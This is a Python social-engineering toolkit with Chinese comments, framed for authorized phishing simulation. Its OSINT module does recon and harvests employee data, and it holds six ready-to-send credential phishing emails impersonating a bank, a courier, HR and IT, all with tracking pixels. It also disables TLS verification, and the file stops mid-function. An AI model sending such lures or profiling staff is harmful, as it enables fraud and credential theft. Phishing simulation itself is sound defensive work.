#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
社会工程学与安全意识工具包 (Social Engineering Toolkit)
=====================================================

本工具包包含以下功能模块:
1. OSINT信息收集工具 - 域名信息、WHOIS、子域名、社交媒体公开信息聚合
2. 钓鱼邮件生成器框架 - 模板渲染、发件人伪装检测
3. 钓鱼网站克隆工具框架 - 网站克隆与表单重定向
4. 钓鱼模拟报告生成器 - 统计点击率、打开率、数据提交率
5. 安全意识测试问卷系统 - 知识测试与评分
6. 密码强度评估工具 - 密码安全评估与改进建议

重要声明:
    本工具包仅用于合法授权的安全评估、教育和研究目的。
    未经授权使用本工具进行信息收集、钓鱼攻击或任何形式的
    社会工程攻击是违法行为，可能导致刑事处罚。
    使用者需自行承担所有法律责任。

作者: 网络安全学习项目
版本: 1.0
日期: 2026-09-11
"""

import os
import re
import json
import time
import random
import string
import hashlib
import getpass
import socket
import unicodedata
from datetime import datetime
from urllib.parse import urljoin, urlparse
from collections import defaultdict, OrderedDict
from http.server import HTTPServer, BaseHTTPRequestHandler


# ============================================================
# 模块1: OSINT信息收集工具
# ============================================================

class OSINTCollector:
    """
    OSINT信息收集工具

    功能:
        - 域名WHOIS信息查询
        - DNS记录查询（A/MX/TXT/NS/CNAME）
        - 子域名枚举（通过证书透明度日志）
        - 邮件安全配置分析（SPF/DKIM/DMARC）
        - 社交媒体公开信息聚合
        - 生成信息收集报告

    使用场景:
        - 授权渗透测试中的信息收集阶段
        - 安全评估中的攻击面分析
        - 威胁情报收集

    注意: 所有信息收集仅在获得授权后进行
    """

    def __init__(self, target_domain, verbose=True):
        """
        初始化OSINT收集器

        参数:
            target_domain: 目标域名（如 example.com）
            verbose: 是否显示详细输出
        """
        self.domain = target_domain.lower().strip()
        # 移除协议前缀
        if self.domain.startswith('http://'):
            self.domain = self.domain[7:]
        if self.domain.startswith('https://'):
            self.domain = self.domain[8:]
        # 移除路径
        self.domain = self.domain.split('/')[0]

        self.verbose = verbose
        self.results = {
            'domain': self.domain,
            'collection_time': datetime.now().isoformat(),
            'whois_info': {},
            'dns_records': {},
            'subdomains': [],
            'email_security': {},
            'social_media': {},
            'summary': {}
        }

    def _log(self, message):
        """内部日志输出"""
        if self.verbose:
            print(f"[*] {message}")

    def query_whois(self):
        """
        查询WHOIS注册信息

        返回域名注册商、注册日期、到期日期、域名服务器等信息。
        使用Python标准库socket进行查询，不依赖第三方库。

        注意: WHOIS服务器可能对查询频率有限制
        """
        self._log(f"正在查询 {self.domain} 的WHOIS信息...")

        whois_servers = [
            'whois.iana.org',
            'whois.internic.net',
        ]

        # 根据TLD选择WHOIS服务器
        tld = self.domain.split('.')[-1].upper()
        tld_whois_map = {
            'COM': 'whois.verisign-grs.com',
            'NET': 'whois.verisign-grs.com',
            'ORG': 'whois.publicinterestregistry.org',
            'CN': 'whois.cnnic.cn',
            'IO': 'whois.nic.io',
        }
        if tld in tld_whois_map:
            whois_servers.insert(0, tld_whois_map[tld])

        whois_data = {}

        for server in whois_servers:
            try:
                # 创建TCP连接到WHOIS服务器（端口43）
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.connect((server, 43))
                # 发送查询请求
                sock.send((self.domain + '\r\n').encode())
                # 接收响应
                response = b''
                while True:
                    data = sock.recv(4096)
                    if not data:
                        break
                    response += data
                sock.close()

                whois_raw = response.decode('utf-8', errors='ignore')

                # 如果得到重定向，使用新的服务器重新查询
                if 'Whois Server:' in whois_raw:
                    redirect_match = re.search(
                        r'Whois Server:\s*(\S+)', whois_raw
                    )
                    if redirect_match:
                        redirect_server = redirect_match.group(1)
                        sock = socket.socket(socket.AF_INET,
                                           socket.SOCK_STREAM)
                        sock.settimeout(10)
                        sock.connect((redirect_server, 43))
                        sock.send((self.domain + '\r\n').encode())
                        response = b''
                        while True:
                            data = sock.recv(4096)
                            if not data:
                                break
                            response += data
                        sock.close()
                        whois_raw = response.decode('utf-8',
                                                   errors='ignore')

                # 解析WHOIS数据
                whois_data['raw'] = whois_raw[:5000]  # 限制存储大小

                # 提取关键字段
                patterns = {
                    'registrar': r'Registrar:\s*(.+)',
                    'creation_date': r'Creation Date:\s*(.+)',
                    'expiration_date': r'Registry Expiry Date:\s*(.+)',
                    'updated_date': r'Updated Date:\s*(.+)',
                    'name_servers': r'Name Server:\s*(.+)',
                    'status': r'Domain Status:\s*(.+)',
                    'registrant': r'Registrant(?:\s+Name)?:\s*(.+)'
                }

                for field, pattern in patterns.items():
                    matches = re.findall(pattern, whois_raw, re.IGNORECASE)
                    if matches:
                        whois_data[field] = matches[0].strip() \
                            if len(matches) == 1 else \
                            [m.strip() for m in matches]

                # 如果找到数据则退出循环
                if len(whois_data) > 1:
                    break

            except Exception as e:
                self._log(f"  WHOIS服务器 {server} 查询失败: {e}")
                continue

        if not whois_data:
            whois_data['error'] = 'WHOIS查询失败，可能需要安装python-whois库'

        self.results['whois_info'] = whois_data
        self._log(f"  WHOIS信息收集完成")
        return whois_data

    def query_dns_records(self):
        """
        查询DNS记录

        查询A、MX、TXT、NS、CNAME等DNS记录。
        使用socket.getaddrinfo进行基础解析，
        建议安装dnspython库以获得更完整的功能。

        查询的记录类型:
            - A: IPv4地址
            - MX: 邮件交换记录
            - TXT: 文本记录（含SPF/DMARC）
            - NS: 域名服务器
            - CNAME: 规范名称
            - AAAA: IPv6地址
        """
        self._log(f"正在查询 {self.domain} 的DNS记录...")

        dns_records = {}

        # A记录查询（IPv4地址）
        try:
            ips = socket.getaddrinfo(self.domain, None, socket.AF_INET)
            a_records = list(set([ip[4][0] for ip in ips]))
            dns_records['A'] = a_records
            self._log(f"  A记录: {a_records}")
        except Exception:
            dns_records['A'] = []

        # AAAA记录查询（IPv6地址）
        try:
            ips = socket.getaddrinfo(self.domain, None, socket.AF_INET6)
            aaaa_records = list(set([ip[4][0] for ip in ips]))
            dns_records['AAAA'] = aaaa_records
        except Exception:
            dns_records['AAAA'] = []

        # MX记录查询（使用nslookup命令作为备选方案）
        try:
            mx_records = self._query_dns_command('MX')
            dns_records['MX'] = mx_records
            self._log(f"  MX记录: {mx_records}")
        except Exception:
            dns_records['MX'] = []

        # TXT记录查询
        try:
            txt_records = self._query_dns_command('TXT')
            dns_records['TXT'] = txt_records
            self._log(f"  TXT记录: {len(txt_records)}条")
        except Exception:
            dns_records['TXT'] = []

        # NS记录查询
        try:
            ns_records = self._query_dns_command('NS')
            dns_records['NS'] = ns_records
            self._log(f"  NS记录: {ns_records}")
        except Exception:
            dns_records['NS'] = []

        self.results['dns_records'] = dns_records
        return dns_records

    def _query_dns_command(self, record_type):
        """
        使用系统nslookup命令查询DNS记录（备选方案）

        当无法使用dnspython库时，通过系统命令进行DNS查询。
        支持Windows和Linux平台。
        """
        import subprocess

        try:
            # 使用nslookup命令查询
            if os.name == 'nt':  # Windows
                cmd = ['nslookup', '-type=' + record_type, self.domain]
            else:  # Linux/Mac
                cmd = ['nslookup', '-type=' + record_type, self.domain]

            result = subprocess.run(
                cmd, capture_output=True, text=True, timeout=10
            )
            output = result.stdout + result.stderr

            # 解析nslookup输出
            records = []
            lines = output.split('\n')
            for line in lines:
                line = line.strip()
                if ' ' in line and 'Address' not in line \
                   and 'Server' not in line and '#' not in line:
                    if record_type == 'MX':
                        # MX记录格式: mail exchanger = 10 mail.example.com
                        if 'mail exchanger' in line.lower():
                            parts = line.split('=')
                            if len(parts) > 1:
                                records.append(parts[-1].strip())
                    elif record_type == 'TXT':
                        # TXT记录格式: text = "v=spf1 ..."
                        if 'text' in line.lower():
                            parts = line.split('=', 1)
                            if len(parts) > 1:
                                records.append(parts[1].strip())
                    elif record_type == 'NS':
                        # NS记录格式: nameserver = ns1.example.com
                        if 'nameserver' in line.lower() or \
                           'n/a' not in line.lower():
                            parts = line.split('=', 1)
                            if len(parts) > 1:
                                record = parts[1].strip()
                                if record and record != '':
                                    records.append(record)
                    else:
                        records.append(line)

            return records
        except Exception as e:
            self._log(f"  DNS命令查询失败 ({record_type}): {e}")
            return []

    def enumerate_subdomains(self):
        """
        子域名枚举

        通过证书透明度日志（crt.sh）进行子域名发现。
        不需要字典暴力破解，利用公开的SSL证书信息。

        原理:
            SSL/TLS证书签发时会记录到证书透明度日志(CT Log)，
            通过查询crt.sh可以获取某个域名下所有已签发证书的子域名。

        注意:
            - 仅能发现签发过SSL证书的子域名
            - 内网域名和未签发证书的域名不会出现
            - 网络请求可能需要代理
        """
        self._log(f"正在枚举 {self.domain} 的子域名（证书透明度日志）...")

        subdomains = set()

        # 方法1: 通过crt.sh查询证书透明度日志
        try:
            import urllib.request
            import ssl

            # 创建不验证SSL的上下文（仅用于测试环境）
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE

            url = f"https://crt.sh/?q=%.{self.domain}&output=json"
            req = urllib.request.Request(
                url,
                headers={'User-Agent': 'Mozilla/5.0'}
            )
            response = urllib.request.urlopen(req, timeout=30, context=ctx)
            data = json.loads(response.read().decode('utf-8'))

            for entry in data:
                name_values = entry.get('name_value', '')
                # 一个证书可能包含多个域名（SAN）
                for name in name_values.split('\n'):
                    name = name.strip().lower()
                    # 过滤通配符域名和重复
                    if name and self.domain in name \
                       and '*' not in name and name != self.domain:
                        subdomains.add(name)

            self._log(f"  通过crt.sh发现 {len(subdomains)} 个子域名")

        except Exception as e:
            self._log(f"  crt.sh查询失败: {e}")
            self._log("  尝试使用常见子域名字典...")

            # 方法2: 常见子域名字典（作为备选方案）
            common_subdomains = [
                'www', 'mail', 'vpn', 'remote', 'portal',
                'admin', 'api', 'dev', 'test', 'staging',
                'git', 'svn', 'jenkins', 'jira', 'wiki',
                'docs', 'help', 'support', 'ftp', 'sftp',
                'webmail', 'oa', 'crm', 'erp', 'hr',
                'login', 'sso', 'auth', 'secure', 'cloud',
                'app', 'mobile', 'm', 'shop', 'store',
                'cdn', 'static', 'img', 'images', 'media',
            ]

            for sub in common_subdomains:
                full_domain = f"{sub}.{self.domain}"
                try:
                    socket.getaddrinfo(full_domain, None, socket.AF_INET)
                    subdomains.add(full_domain)
                    self._log(f"  发现子域名: {full_domain}")
                except socket.gaierror:
                    pass  # 域名不存在，跳过
                except Exception:
                    pass

        subdomain_list = sorted(subdomains)
        self.results['subdomains'] = subdomain_list
        self._log(f"  子域名枚举完成，共 {len(subdomain_list)} 个")
        return subdomain_list

    def analyze_email_security(self):
        """
        邮件安全配置分析

        分析目标的SPF、DKIM、DMARC配置:
            - SPF (Sender Policy Framework): 防止发件人伪造
            - DKIM (DomainKeys Identified Mail): 邮件签名验证
            - DMARC: 统一的邮件认证策略

        安全等级评估:
            - 完善: SPF(-all) + DKIM + DMARC(reject)
            - 良好: SPF(~all) + DKIM + DMARC(quarantine)
            - 一般: SPF存在 + DMARC(none)
            - 不足: 缺少SPF或DMARC
            - 危险: 无任何邮件安全配置
        """
        self._log(f"正在分析 {self.domain} 的邮件安全配置...")

        email_security = {
            'spf': {'found': False, 'record': '', 'policy': ''},
            'dkim': {'found': False, 'selectors': []},
            'dmarc': {'found': False, 'record': '', 'policy': ''},
            'security_level': '',
            'recommendations': []
        }

        # 获取TXT记录
        txt_records = self.results.get('dns_records', {}).get('TXT', [])
        if not txt_records:
            txt_records = self._query_dns_command('TXT')

        # 分析SPF记录
        for txt in txt_records:
            txt_clean = txt.strip('"').strip("'")
            if txt_clean.startswith('v=spf1'):
                email_security['spf']['found'] = True
                email_security['spf']['record'] = txt_clean

                # 分析SPF策略
                if '-all' in txt_clean:
                    email_security['spf']['policy'] = '严格拒绝(-all)'
                elif '~all' in txt_clean:
                    email_security['spf']['policy'] = '软失败(~all)'
                elif '?all' in txt_clean:
                    email_security['spf']['policy'] = '中性(?all)'
                elif '+all' in txt_clean:
                    email_security['spf']['policy'] = '允许所有(+all) - 危险!'
                else:
                    email_security['spf']['policy'] = '未知'

                self._log(f"  SPF记录: {txt_clean[:80]}...")
                break

        # 分析DMARC记录（查询_dmarc子域名）
        try:
            dmarc_domain = f"_dmarc.{self.domain}"
            dmarc_records = self._query_dns_command('TXT')
            # 直接查询_dmarc子域名的TXT记录
            import subprocess
            if os.name == 'nt':
                cmd = ['nslookup', '-type=TXT', dmarc_domain]
            else:
                cmd = ['nslookup', '-type=TXT', dmarc_domain]
            result = subprocess.run(
                cmd, capture_output=True, text=True, timeout=10
            )
            output = result.stdout + result.stderr

            if 'v=DMARC1' in output.upper():
                email_security['dmarc']['found'] = True
                # 提取DMARC记录
                match = re.search(
                    r'v=DMARC1;[^"\r\n]*', output, re.IGNORECASE
                )
                if match:
                    email_security['dmarc']['record'] = match.group(0)

                    # 分析DMARC策略
                    if 'p=reject' in match.group(0).lower():
                        email_security['dmarc']['policy'] = '拒绝(reject)'
                    elif 'p=quarantine' in match.group(0).lower():
                        email_security['dmarc']['policy'] = '隔离(quarantine)'
                    elif 'p=none' in match.group(0).lower():
                        email_security['dmarc']['policy'] = '仅监控(none)'

                self._log(f"  DMARC: 已配置")
            else:
                self._log(f"  DMARC: 未配置")
        except Exception as e:
            self._log(f"  DMARC查询失败: {e}")

        # 检查DKIM（需要知道选择器，这里检查常见选择器）
        common_selectors = ['default', 'selector1', 'selector2',
                           'google', 's1', 's2', 'k1']
        for selector in common_selectors:
            try:
                dkim_domain = f"{selector}._domainkey.{self.domain}"
                import subprocess
                if os.name == 'nt':
                    cmd = ['nslookup', '-type=TXT', dkim_domain]
                else:
                    cmd = ['nslookup', '-type=TXT', dkim_domain]
                result = subprocess.run(
                    cmd, capture_output=True, text=True, timeout=5
                )
                output = result.stdout + result.stderr
                if 'v=DKIM1' in output.upper() or 'p=' in output:
                    email_security['dkim']['found'] = True
                    email_security['dkim']['selectors'].append(selector)
                    self._log(f"  DKIM: 发现选择器 '{selector}'")
            except Exception:
                pass

        # 安全等级评估
        spf_found = email_security['spf']['found']
        dkim_found = email_security['dkim']['found']
        dmarc_found = email_security['dmarc']['found']
        spf_strict = '-all' in email_security['spf'].get('record', '')
        dmarc_strict = 'reject' in email_security['dmarc'].get(
            'policy', '').lower()

        if spf_found and dkim_found and dmarc_found and \
           spf_strict and dmarc_strict:
            email_security['security_level'] = '完善'
        elif spf_found and dkim_found and dmarc_found:
            email_security['security_level'] = '良好'
        elif spf_found and dmarc_found:
            email_security['security_level'] = '一般'
        elif spf_found:
            email_security['security_level'] = '不足'
        else:
            email_security['security_level'] = '危险'

        # 生成改进建议
        if not spf_found:
            email_security['recommendations'].append(
                '建议配置SPF记录以防止发件人伪造'
            )
        elif not spf_strict:
            email_security['recommendations'].append(
                '建议将SPF策略从软失败(~all)升级为严格拒绝(-all)'
            )
        if not dkim_found:
            email_security['recommendations'].append(
                '建议配置DKIM签名以验证邮件完整性'
            )
        if not dmarc_found:
            email_security['recommendations'].append(
                '建议配置DMARC策略以统一邮件认证'
            )
        elif 'none' in email_security['dmarc'].get('policy', '').lower():
            email_security['recommendations'].append(
                '建议将DMARC策略从none升级为quarantine或reject'
            )

        self.results['email_security'] = email_security
        self._log(f"  邮件安全等级: {email_security['security_level']}")
        return email_security

    def collect_social_media_info(self, company_name=None):
        """
        社交媒体公开信息聚合

        收集与目标域名/组织相关的社交媒体公开信息。
        提供搜索链接和建议，而非直接爬取（尊重平台规则）。

        功能:
            - 生成各平台搜索链接
            - 提供信息收集建议清单
            - 邮箱格式推断

        参数:
            company_name: 公司名称（用于社交媒体搜索）
        """
        self._log(f"正在聚合社交媒体信息...")

        if not company_name:
            company_name = self.domain.split('.')[0]

        social_info = {
            'company_name': company_name,
            'search_links': {},
            'email_patterns': [],
            'collection_checklist': []
        }

        # 生成各平台搜索链接
        social_info['search_links'] = {
            'LinkedIn公司搜索': f'https://www.linkedin.com/search/results/companies/?keywords={company_name}',
            'LinkedIn员工搜索': f'https://www.linkedin.com/search/results/people/?currentCompany=["{company_name}"]',
            'GitHub组织搜索': f'https://github.com/search?q={company_name}&type=orgs',
            'GitHub代码搜索': f'https://github.com/search?q={self.domain}&type=code',
            'Twitter搜索': f'https://twitter.com/search?q={company_name}&src=typed_query',
            'Google搜索': f'https://www.google.com/search?q=site:{self.domain}',
            'Google文件搜索': f'https://www.google.com/search?q=site:{self.domain}+(filetype:pdf|filetype:doc|filetype:xls)',
            'Bing搜索': f'https://www.bing.com/search?q=site:{self.domain}',
            'YouTube搜索': f'https://www.youtube.com/results?search_query={company_name}',
        }

        # 邮箱格式推断（基于常见企业邮箱命名规则）
        email_patterns = [
            f'firstname@{self.domain}',
            f'firstname.lastname@{self.domain}',
            f'firstnamelastname@{self.domain}',
            f'firstname_lastname@{self.domain}',
            f'flastname@{self.domain}',  # 首字母+姓
            f'lastname@{self.domain}',
            f'lastname.firstname@{self.domain}',
            f'firstname.l@{self.domain}',
        ]
        social_info['email_patterns'] = email_patterns

        # 信息收集检查清单
        social_info['collection_checklist'] = [
            'LinkedIn: 收集员工姓名、职位、入职时间',
            'GitHub: 搜索代码泄露、邮箱地址、技术栈',
            '公司官网: 收集组织架构、新闻稿、招聘信息',
            '招聘网站: 分析JD中的技术栈和团队结构',
            '社交媒体: 收集员工活动、兴趣、关系网络',
            '行业报告: 了解行业和竞争对手信息',
            '公开文档: 搜索PDF/DOC/XLS等文件',
            'DNS/SSL: 子域名和证书信息',
            'Wayback Machine: 查看网站历史变化',
            '域名注册: WHOIS和相似域名',
        ]

        self.results['social_media'] = social_info
        self._log(f"  社交媒体信息聚合完成")
        return social_info

    def generate_report(self):
        """
        生成OSINT信息收集报告

        汇总所有收集到的信息，生成结构化的报告。
        报告包含:
            - 收集时间和方法
            - WHOIS信息
            - DNS记录
            - 子域名列表
            - 邮件安全分析
            - 社交媒体信息
            - 攻击面评估
            - 改进建议
        """
        # 生成摘要
        summary = {
            'domain': self.domain,
            'collection_time': self.results['collection_time'],
            'subdomain_count': len(self.results.get('subdomains', [])),
            'email_security_level': self.results.get(
                'email_security', {}).get('security_level', '未知'),
            'dns_records_count': sum(
                len(v) for v in self.results.get(
                    'dns_records', {}).values() if isinstance(v, list)
            ),
            'has_whois': bool(self.results.get('whois_info')),
        }
        self.results['summary'] = summary

        # 生成文本报告
        report = f"""
{'=' * 60}
    OSINT信息收集报告
{'=' * 60}

目标域名: {self.domain}
收集时间: {self.results['collection_time']}

{'─' * 60}
一、WHOIS信息
{'─' * 60}
"""
        whois = self.results.get('whois_info', {})
        if whois.get('registrar'):
            report += f"  注册商: {whois['registrar']}\n"
        if whois.get('creation_date'):
            report += f"  注册日期: {whois['creation_date']}\n"
        if whois.get('expiration_date'):
            report += f"  到期日期: {whois['expiration_date']}\n"
        if whois.get('name_servers'):
            ns = whois['name_servers']
            if isinstance(ns, list):
                report += f"  域名服务器: {', '.join(ns[:5])}\n"
            else:
                report += f"  域名服务器: {ns}\n"
        if whois.get('error'):
            report += f"  错误: {whois['error']}\n"

        report += f"""
{'─' * 60}
二、DNS记录
{'─' * 60}
"""
        dns = self.results.get('dns_records', {})
        for rtype in ['A', 'AAAA', 'MX', 'TXT', 'NS']:
            records = dns.get(rtype, [])
            if records:
                report += f"  {rtype}记录:\n"
                for r in records[:5]:
                    report += f"    - {r}\n"

        report += f"""
{'─' * 60}
三、子域名 ({len(self.results.get('subdomains', []))} 个)
{'─' * 60}
"""
        for sd in self.results.get('subdomains', [])[:20]:
            report += f"  - {sd}\n"
        if len(self.results.get('subdomains', [])) > 20:
            report += f"  ... 还有 {len(self.results['subdomains']) - 20} 个子域名\n"

        report += f"""
{'─' * 60}
四、邮件安全配置
{'─' * 60}
"""
        email_sec = self.results.get('email_security', {})
        report += f"  安全等级: {email_sec.get('security_level', '未知')}\n"
        if email_sec.get('spf', {}).get('found'):
            report += f"  SPF: 已配置 ({email_sec['spf']['policy']})\n"
        else:
            report += f"  SPF: 未配置\n"
        if email_sec.get('dkim', {}).get('found'):
            report += f"  DKIM: 已配置 (选择器: {', '.join(email_sec['dkim']['selectors'])})\n"
        else:
            report += f"  DKIM: 未检测到\n"
        if email_sec.get('dmarc', {}).get('found'):
            report += f"  DMARC: 已配置 ({email_sec['dmarc']['policy']})\n"
        else:
            report += f"  DMARC: 未配置\n"

        if email_sec.get('recommendations'):
            report += "\n  改进建议:\n"
            for rec in email_sec['recommendations']:
                report += f"    * {rec}\n"

        report += f"""
{'─' * 60}
五、社交媒体信息
{'─' * 60}
"""
        social = self.results.get('social_media', {})
        if social:
            report += f"  公司名称: {social.get('company_name', 'N/A')}\n"
            report += f"  推断邮箱格式:\n"
            for pattern in social.get('email_patterns', [])[:5]:
                report += f"    - {pattern}\n"

        report += f"""
{'=' * 60}
    报告结束
{'=' * 60}
"""
        return report

    def run_all(self):
        """执行所有OSINT收集任务"""
        self._log(f"开始OSINT信息收集: {self.domain}")
        self._log("=" * 50)

        self.query_whois()
        self.query_dns_records()
        self.enumerate_subdomains()
        self.analyze_email_security()
        self.collect_social_media_info()

        self._log("=" * 50)
        self._log("OSINT信息收集完成!")

        return self.results


# ============================================================
# 模块2: 钓鱼邮件生成器框架
# ============================================================

class PhishingEmailGenerator:
    """
    钓鱼邮件生成器框架

    功能:
        - 邮件模板管理（加载、渲染、存储）
        - 发件人伪装检测（分析发件人地址可疑特征）
        - 邮件HTML内容生成
        - 模板变量替换（个性化定制）
        - 邮件安全特征分析

    使用场景:
        - 授权钓鱼模拟演练中生成测试邮件
        - 安全意识培训中展示钓鱼邮件特征
        - 邮件安全规则测试

    重要: 仅用于授权安全评估和教育目的
    """

    # 内置邮件模板库
    TEMPLATES = {
        'password_expiry': {
            'name': '密码过期通知',
            'subject': '【重要】您的账户密码将在24小时内过期',
            'category': 'IT通知',
            'difficulty': '简单',
            'html': """<!DOCTYPE html>
<html>
<body style="font-family: Arial, sans-serif; margin: 0; padding: 20px;">
  <div style="max-width: 600px; margin: 0 auto; border: 1px solid #ddd;">
    <div style="background-color: #0078D4; color: white; padding: 15px;">
      <h2 style="margin: 0;">IT运维中心</h2>
    </div>
    <div style="padding: 20px;">
      <p>亲爱的 {{first_name}}，</p>
      <p>您的企业账户密码将在 <strong style="color: red;">24小时内</strong> 过期。</p>
      <p>为确保正常使用邮件、ERP等办公系统，请及时更新密码。</p>
      <p>点击下方按钮立即更新：</p>
      <p>
        <a href="{{phishing_url}}" style="background-color: #0078D4; color: white;
           padding: 10px 30px; text-decoration: none; display: inline-block;">
          更新密码
        </a>
      </p>
      <p style="color: #666; font-size: 12px;">如有疑问，请联系IT运维热线。</p>
    </div>
  </div>
  <img src="{{tracking_pixel}}" width="1" height="1" />
</body>
</html>"""
        },
        'shared_document': {
            'name': '共享文档通知',
            'subject': '{{sender_name}} 与您共享了文档',
            'category': '协作通知',
            'difficulty': '中等',
            'html': """<!DOCTYPE html>
<html>
<body style="font-family: Arial, sans-serif; margin: 0; padding: 20px;">
  <div style="max-width: 600px; margin: 0 auto; border: 1px solid #ddd; padding: 20px;">
    <table>
      <tr>
        <td style="width: 50px;">
          <div style="width: 40px; height: 40px; background-color: #4CAF50;
               border-radius: 4px; text-align: center; line-height: 40px;
               color: white; font-size: 20px;">D</div>
        </td>
        <td>
          <p><strong>{{sender_name}}</strong> 与您共享了文档</p>
          <p style="color: #666;">"{{document_name}}"</p>
        </td>
      </tr>
    </table>
    <p style="margin: 20px 0;">
      <a href="{{phishing_url}}" style="background-color: #4CAF50; color: white;
         padding: 10px 40px; text-decoration: none; display: inline-block;">
        查看文档
      </a>
    </p>
    <p style="color: #999; font-size: 11px;">本邮件由系统自动发送。</p>
  </div>
  <img src="{{tracking_pixel}}" width="1" height="1" />
</body>
</html>"""
        },
        'delivery_notice': {
            'name': '快递通知',
            'subject': '【顺丰速运】您的包裹无法派送',
            'category': '生活通知',
            'difficulty': '简单',
            'html': """<!DOCTYPE html>
<html>
<body style="font-family: Arial, sans-serif; margin: 0; padding: 20px;">
  <div style="max-width: 600px; margin: 0 auto; border: 1px solid #ddd; padding: 20px;">
    <h3 style="color: #333;">【顺丰速运】</h3>
    <p>尊敬的客户，</p>
    <p>您的包裹 <strong>{{tracking_number}}</strong> 因地址不详无法派送。</p>
    <p>请在24小时内更新配送信息，否则包裹将被退回。</p>
    <p>
      <a href="{{phishing_url}}" style="color: #0066cc;">点击更新配送信息</a>
    </p>
    <p style="color: #999; font-size: 11px; margin-top: 30px;">
      顺丰速运 | 客服热线: 95338
    </p>
  </div>
  <img src="{{tracking_pixel}}" width="1" height="1" />
</body>
</html>"""
        },
        'bank_verification': {
            'name': '银行验证',
            'subject': '【招商银行】验证您的账户',
            'category': '金融通知',
            'difficulty': '中等',
            'html': """<!DOCTYPE html>
<html>
<body style="font-family: Arial, sans-serif; margin: 0; padding: 20px;">
  <div style="max-width: 600px; margin: 0 auto;">
    <div style="background-color: #C8161D; color: white; padding: 15px;">
      <h2 style="margin: 0;">招商银行</h2>
    </div>
    <div style="border: 1px solid #ddd; padding: 20px;">
      <p>尊敬的 {{first_name}} 先生/女士，</p>
      <p>我们检测到您的账户存在异常登录活动。</p>
      <p>为保障您的资金安全，请立即验证您的身份。</p>
      <p>如未在24小时内完成验证，您的账户将被临时冻结。</p>
      <p>
        <a href="{{phishing_url}}" style="background-color: #C8161D; color: white;
           padding: 10px 30px; text-decoration: none; display: inline-block;">
          立即验证
        </a>
      </p>
      <p style="color: #999; font-size: 11px;">招商银行客服: 95555</p>
    </div>
  </div>
  <img src="{{tracking_pixel}}" width="1" height="1" />
</body>
</html>"""
        },
        'hr_salary': {
            'name': 'HR薪资确认',
            'subject': '【人力资源部】2026年Q3薪资确认',
            'category': 'HR通知',
            'difficulty': '困难',
            'html': """<!DOCTYPE html>
<html>
<body style="font-family: Arial, sans-serif; margin: 0; padding: 20px;">
  <div style="max-width: 600px; margin: 0 auto; border: 1px solid #ddd;">
    <div style="background-color: #2c3e50; color: white; padding: 15px;">
      <h2 style="margin: 0;">人力资源部</h2>
    </div>
    <div style="padding: 20px;">
      <p>亲爱的 {{first_name}}，</p>
      <p>2026年第三季度薪资调整方案已公布。</p>
      <p>请登录HR系统确认您的薪资信息。</p>
      <p><strong>注意：确认窗口将于本周五18:00关闭。</strong></p>
      <p>逾期未确认者视为放弃本次薪资调整。</p>
      <p>
        <a href="{{phishing_url}}" style="background-color: #2c3e50; color: white;
           padding: 10px 30px; text-decoration: none; display: inline-block;">
          登录HR系统确认
        </a>
      </p>
      <p style="color: #999; font-size: 11px;">人力资源部 | 内线: 8001</p>
    </div>
  </div>
  <img src="{{tracking_pixel}}" width="1" height="1" />
</body>
</html>"""
        },
        'supplier_invoice': {
            'name': '供应商发票确认',
            'subject': '发票确认 - {{invoice_number}} - 请尽快处理',
            'category': '财务通知',
            'difficulty': '困难',
            'html': """<!DOCTYPE html>
<html>
<body style="font-family: Arial, sans-serif; margin: 0; padding: 20px;">
  <div style="max-width: 600px; margin: 0 auto; border: 1px solid #ddd;">
    <div style="background-color: #1a5276; color: white; padding: 15px;">
      <h2 style="margin: 0;">供应商管理系统</h2>
    </div>
    <div style="padding: 20px;">
      <p>尊敬的 {{first_name}} 经理，</p>
      <p>供应商 <strong>{{supplier_name}}</strong> 提交了新发票，需要您确认。</p>
      <table style="width: 100%; border-collapse: collapse; margin: 15px 0;">
        <tr style="background-color: #f0f0f0;">
          <td style="padding: 8px; border: 1px solid #ddd;">发票号</td>
          <td style="padding: 8px; border: 1px solid #ddd;">{{invoice_number}}</td>
        </tr>
        <tr>
          <td style="padding: 8px; border: 1px solid #ddd;">金额</td>
          <td style="padding: 8px; border: 1px solid #ddd;">¥{{amount}}</td>
        </tr>
        <tr style="background-color: #f0f0f0;">
          <td style="padding: 8px; border: 1px solid #ddd;">到期日</td>
          <td style="padding: 8px; border: 1px solid #ddd;">{{due_date}}</td>
        </tr>
      </table>
      <p>请尽快确认以避免延迟付款。</p>
      <p>
        <a href="{{phishing_url}}" style="background-color: #1a5276; color: white;
           padding: 10px 30px; text-decoration: none; display: inline-block;">
          查看并确认发票
        </a>
      </p>
    </div>
  </div>
  <img src="{{tracking_pixel}}" width="1" height="1" />
</body>
</html>"""
        }
    }

    def __init__(self):
        """初始化钓鱼邮件生成器"""
        self.templates = self.TEMPLATES.copy()

    def list_templates(self):
        """列出所有可用模板"""
        print("\n可用邮件模板:")
        print("-" * 60)
        for key, tmpl in self.templates.items():
            print(f"  [{key}]")
            print(f"    名称: {tmpl['name']}")
            print(f"    分类: {tmpl['category']}")
            print(f"    难度: {tmpl['difficulty']}")
            print(f"    主题: {tmpl['subject']}")
            print()
        return list(self.templates.keys())

    def render_template(self, template_key, variables):
        """
        渲染邮件模板

        将模板中的占位符替换为实际变量值。

        参数:
            template_key: 模板键名
            variables: 变量字典，如:
                {
                    'first_name': '张三',
                    'phishing_url': 'http://example.com/login',
                    'tracking_pixel': 'http://example.com/track',
                    'sender_name': '李四',
                    'document_name': '项目计划.xlsx'
                }

        返回:
            渲染后的主题和HTML内容
        """
        if template_key not in self.templates:
            raise ValueError(f"模板 '{template_key}' 不存在")

        template = self.templates[template_key]
        subject = template['subject']
        html = template['html']

        # 变量替换
        for key, value in variables.items():
            placeholder = '{{' + key + '}}'
            subject = subject.replace(placeholder, str(value))
            html = html.replace(placeholder, str(value))

        return {
            'template_name': template['name'],
            'subject': subject,
            'html': html,
            'category': template['category'],
            'difficulty': template['difficulty']
        }

    def add_custom_template(self, key, name, subject, html,
                           category='自定义', difficulty='自定义'):
        """添加自定义邮件模板"""
        self.templates[key] = {
            'name': name,
            'subject': subject,
            'html': html,
            'category': category,
            'difficulty': difficulty
        }
        print(f"自定义模板 '{key}' 已添加")

    def analyze_sender(self, sender_email, sender_display_name=''):
        """
        发件人伪装检测

        分析发件人地址中的可疑特征，帮助识别钓鱼邮件。

        检测项:
            - 域名相似度（与已知品牌域名对比）
